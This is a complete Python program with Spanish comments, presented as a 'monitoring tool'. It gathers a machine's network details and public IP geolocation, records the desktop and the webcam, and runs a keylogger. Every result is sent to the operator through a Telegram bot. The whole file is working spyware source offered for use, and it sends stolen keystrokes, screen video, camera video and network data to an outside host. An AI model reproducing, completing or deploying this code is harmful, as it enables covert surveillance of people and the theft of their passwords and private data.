import socket
import psutil
import os
import subprocess
import requests
import time
import platform
from PIL import ImageGrab
import cv2
import keyboard
import numpy as np
import logging
from tkinter import Tk, Button, Label, messagebox

# Configuración del logging
logging.basicConfig(
    filename="app.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
)
logging.info("Aplicación iniciada.")

# Credenciales del bot de Telegram (usar botfhater de telegram)
BOT_TOKEN = ''  # API Key del bot
CHAT_ID = ''  # Reemplaza con tu Chat ID (debe ser un número entero)

# Función para enviar mensajes a través del bot de Telegram
def enviar_mensaje_telegram(mensaje):
    """
    Envía un mensaje a través del bot de Telegram.
    :param mensaje: El mensaje que se desea enviar.
    :return: True si el mensaje se envió correctamente, False en caso contrario.
    """
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
    params = {
        'chat_id': CHAT_ID,
        'text': mensaje
    }
    try:
        response = requests.post(url, data=params)
        if response.status_code == 200:
            logging.info("Mensaje enviado correctamente a través de Telegram.")
            return True
        else:
            logging.error(f"Error al enviar el mensaje: {response.status_code} - {response.text}")
            return False
    except Exception as e:
        logging.error(f"Error de conexión: {e}")
        return False

# Función para enviar archivos a través del bot de Telegram
def enviar_archivo_telegram(archivo):
    """
    Envía un archivo a través del bot de Telegram.
    :param archivo: Ruta del archivo que se desea enviar.
    :return: True si el archivo se envió correctamente, False en caso contrario.
    """
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendDocument'
    with open(archivo, 'rb') as file:
        files = {'document': file}
        data = {'chat_id': CHAT_ID}
        response = requests.post(url, files=files, data=data)
    if response.status_code == 200:
        logging.info("Archivo enviado correctamente.")
        return True
    else:
        logging.error(f"Error al enviar el archivo: {response.text}")
        return False

# Función para obtener la IP pública y la geolocalización
def obtener_geolocalizacion():
    try:
        # Obtener la IP pública y detalles de geolocalización
        response = requests.get('https://ipinfo.io')
        data = response.json()

        # Extraer información relevante
        ip_publica = data.get('ip', 'No disponible')
        ciudad = data.get('city', 'No disponible')
        region = data.get('region', 'No disponible')
        pais = data.get('country', 'No disponible')
        ubicacion = data.get('loc', 'No disponible')  # Latitud y longitud

        mensaje = f"""
        Información de IP pública y geolocalización:
        - IP Pública: {ip_publica}
        - Ciudad: {ciudad}
        - Región: {region}
        - País: {pais}
        - Ubicación (Latitud, Longitud): {ubicacion}
        """
        return mensaje
    except Exception as e:
        logging.error(f"Error al obtener la geolocalización: {e}")
        return f"Error al obtener la geolocalización: {e}"

# Función para obtener información detallada de la red
def obtener_datos_conexion():
    try:
        # Obtener nombre de host y tipo de nodo
        nombre_host = socket.gethostname()
        tipo_nodo = platform.node()

        # Obtener información de las interfaces de red
        interfaces = psutil.net_if_addrs()
        stats = psutil.net_if_stats()
        conexiones = psutil.net_connections()
        dhcp_habilitado = "Sí" if "dhcp" in str(subprocess.check_output("ipconfig", shell=True)).lower() else "No"

        # Obtener información del adaptador Ethernet
        ethernet_info = {}
        for interfaz, direcciones in interfaces.items():
            if "Ethernet" in interfaz:
                for direccion in direcciones:
                    if direccion.family == psutil.AF_LINK:  # Dirección física (MAC)
                        ethernet_info['MAC'] = direccion.address
                    elif direccion.family == socket.AF_INET:  # IPv4
                        ethernet_info['IPv4'] = direccion.address
                        ethernet_info['Máscara de subred'] = direccion.netmask
                    elif direccion.family == socket.AF_INET6:  # IPv6
                        ethernet_info['IPv6'] = direccion.address

        # Obtener puerta de enlace predeterminada
        puerta_enlace = subprocess.check_output("ipconfig | findstr Puerta", shell=True).decode('latin-1').strip()

        # Obtener servidores DNS
        dns_servers = subprocess.check_output("ipconfig /all | findstr Servidores", shell=True).decode('latin-1').strip()

        # Obtener estado de NetBIOS TCP/IP
        netbios_habilitado = "Sí" if "habilitado" in subprocess.check_output("ipconfig /all | findstr NetBIOS", shell=True).decode('latin-1').lower() else "No"

        # Obtener geolocalización
        geolocalizacion = obtener_geolocalizacion()

        # Formatear la información
        mensaje = f"""
        Información de red:
        - Nombre de host: {nombre_host}
        - Tipo de nodo: {tipo_nodo}
        - Adaptador Ethernet:
          * Dirección física (MAC): {ethernet_info.get('MAC', 'No disponible')}
          * IPv4: {ethernet_info.get('IPv4', 'No disponible')}
          * Máscara de subred: {ethernet_info.get('Máscara de subred', 'No disponible')}
          * IPv6: {ethernet_info.get('IPv6', 'No disponible')}
        - DHCP habilitado: {dhcp_habilitado}
        - Puerta de enlace predeterminada: {puerta_enlace}
        - Servidores DNS: {dns_servers}
        - NetBIOS TCP/IP habilitado: {netbios_habilitado}
        {geolocalizacion}
        """
        return mensaje
    except Exception as e:
        logging.error(f"Error al obtener datos de conexión: {e}")
        return f"Error al obtener datos de conexión: {e}"

# Función para capturar un video del escritorio
def capturar_video_escritorio(duracion=5):
    """
    Captura un video del escritorio.
    :param duracion: Duración del video en segundos.
    :return: Ruta del archivo de video.
    """
    try:
        # Configuración del video
        fps = 10
        resolucion = (1920, 1080)
        codec = cv2.VideoWriter_fourcc(*'XVID')
        ruta_video = "captura_escritorio.avi"
        out = cv2.VideoWriter(ruta_video, codec, fps, resolucion)

        # Capturar frames
        start_time = time.time()
        while time.time() - start_time < duracion:
            img = ImageGrab.grab()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            out.write(frame)
        out.release()
        logging.info("Video del escritorio capturado correctamente.")
        return ruta_video
    except Exception as e:
        logging.error(f"Error al capturar video del escritorio: {e}")
        return None

# Función para capturar un video de la cámara
def capturar_video_camara(duracion=5):
    """
    Captura un video de la cámara.
    :param duracion: Duración del video en segundos.
    :return: Ruta del archivo de video.
    """
    try:
        captura = cv2.VideoCapture(0)
        fps = int(captura.get(cv2.CAP_PROP_FPS))
        resolucion = (int(captura.get(cv2.CAP_PROP_FRAME_WIDTH)), int(captura.get(cv2.CAP_PROP_FRAME_HEIGHT)))
        codec = cv2.VideoWriter_fourcc(*'XVID')
        ruta_video = "captura_camara.avi"
        out = cv2.VideoWriter(ruta_video, codec, fps, resolucion)

        # Capturar frames
        start_time = time.time()
        while time.time() - start_time < duracion:
            ret, frame = captura.read()
            if ret:
                out.write(frame)
            else:
                break
        captura.release()
        out.release()
        logging.info("Video de la cámara capturado correctamente.")
        return ruta_video
    except Exception as e:
        logging.error(f"Error al capturar video de la cámara: {e}")
        return None

# Función para activar el keylogger
def keylogger(duracion=50):
    """
    Activa un keylogger durante un tiempo determinado.
    :param duracion: Duración en segundos.
    :return: Ruta del archivo de registro.
    """
    eventos = []
    start_time = time.time()

    def on_key_event(event):
        eventos.append(event.name)

    keyboard.on_release(on_key_event)

    logging.info(f"Keylogger activado. Grabando durante {duracion} segundos...")
    while time.time() - start_time < duracion:
        time.sleep(0.1)

    keyboard.unhook_all()
    logging.info("Keylogger desactivado.")

    # Guardar los eventos en un archivo
    ruta_keylog = "keylog.txt"
    with open(ruta_keylog, "w") as file:
        file.write("\n".join(eventos))
    return ruta_keylog

# Interfaz gráfica
def crear_interfaz():
    def opcion_1():
        datos_conexion = obtener_datos_conexion()
        if enviar_mensaje_telegram(datos_conexion):
            messagebox.showinfo("Éxito", "Datos de conexión enviados correctamente.")
        else:
            messagebox.showerror("Error", "No se pudo enviar los datos de conexión.")

    def opcion_2():
        ruta_escritorio = capturar_video_escritorio(5)
        ruta_camara = capturar_video_camara(5)
        if ruta_escritorio and enviar_archivo_telegram(ruta_escritorio):
            messagebox.showinfo("Éxito", "Video del escritorio enviado correctamente.")
        else:
            messagebox.showerror("Error", "No se pudo enviar el video del escritorio.")
        if ruta_camara and enviar_archivo_telegram(ruta_camara):
            messagebox.showinfo("Éxito", "Video de la cámara enviado correctamente.")
        else:
            messagebox.showerror("Error", "No se pudo enviar el video de la cámara.")

    def opcion_3():
        ruta_keylog = keylogger(50)
        if enviar_archivo_telegram(ruta_keylog):
            messagebox.showinfo("Éxito", "Keylog enviado correctamente.")
        else:
            messagebox.showerror("Error", "No se pudo enviar el keylog.")

    def opcion_4():
        logging.info("Aplicación finalizada.")
        root.destroy()

    # Crear la ventana principal
    root = Tk()
    root.title("Herramienta de Monitoreo")
    root.geometry("400x300")

    # Botones de la interfaz
    Label(root, text="Selecciona una opción:").pack(pady=10)
    Button(root, text="1. Enviar datos de conexión", command=opcion_1).pack(pady=5)
    Button(root, text="2. Capturar video (escritorio y cámara)", command=opcion_2).pack(pady=5)
    Button(root, text="3. Activar keylogger (50 segundos)", command=opcion_3).pack(pady=5)
    Button(root, text="4. Finalizar proceso", command=opcion_4).pack(pady=5)

    # Iniciar la interfaz
    root.mainloop()

# Ejecutar la interfaz
if __name__ == "__main__":
    crear_interfaz()
